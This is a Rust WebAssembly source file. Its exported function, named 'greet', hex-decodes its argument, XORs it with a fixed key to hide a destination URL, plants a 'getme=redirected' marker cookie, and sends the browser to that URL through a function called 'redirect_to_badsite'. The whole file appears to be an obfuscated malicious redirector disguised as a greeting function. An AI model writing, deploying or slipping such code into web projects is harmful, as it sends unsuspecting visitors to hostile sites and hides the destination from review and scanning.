#![deny(unsafe_code)]
use wasm_bindgen::prelude::*;
use web_sys::{window, HtmlDocument, Document, Location};

fn set_cookie() -> Result<(), JsValue> {
    let window = window().ok_or("no global window exists")?;
    let document: Document = window.document().ok_or("no document exists")?;
    let html_document: HtmlDocument = document.dyn_into::<HtmlDocument>()?;
    /* Cookie string is built from the following values. However, we have hardcoded as the format library is quite large.
    let cookie = format!(
        "{}={}; max-age={}; path=/; samesite=lax",
        name,
        value,
        24 * 60 * 60
    );
    */
    let cookie: &'static str = "getme=redirected; max-age=86400; path=/; samesite=lax";
    
    html_document.set_cookie(&cookie)?;
    Ok(())

}

fn redirect_to_badsite(loc: &str) -> Result<(), JsValue> {
    let window = window().ok_or("no global window exists")?;
    let location: Location = window.location();
    
    location.set_href(loc)?;
    Ok(())
}

// Only used for debugging purposes
/*
#[wasm_bindgen]
extern "C" {
    #[wasm_bindgen(js_namespace = console)]
    fn log(s: &str);
}
*/

fn decode_url(encoded_url: &str) -> Result<String, JsValue> {
    let decoded_url = hex::decode(encoded_url).map_err(|_| JsValue::from_str("Invalid hex encoding"))?;
    let decoded_bytes = decoded_url.into_iter().map(|x: u8| x^b'K').collect();
    let decoded_url = String::from_utf8(decoded_bytes).map_err(|_| JsValue::from_str("Invalid UTF-8 sequence"))?;
    if ! decoded_url.starts_with("http") {
        return Err(JsValue::from_str("Invalid Decoded URL"));
    }
    Ok(decoded_url)
}

#[wasm_bindgen]
pub fn greet(name: &str) -> Result<(), JsValue> {
    let decoded_url = decode_url(name)?;
    set_cookie()?;
    redirect_to_badsite(&decoded_url)?;
    Ok(())
}
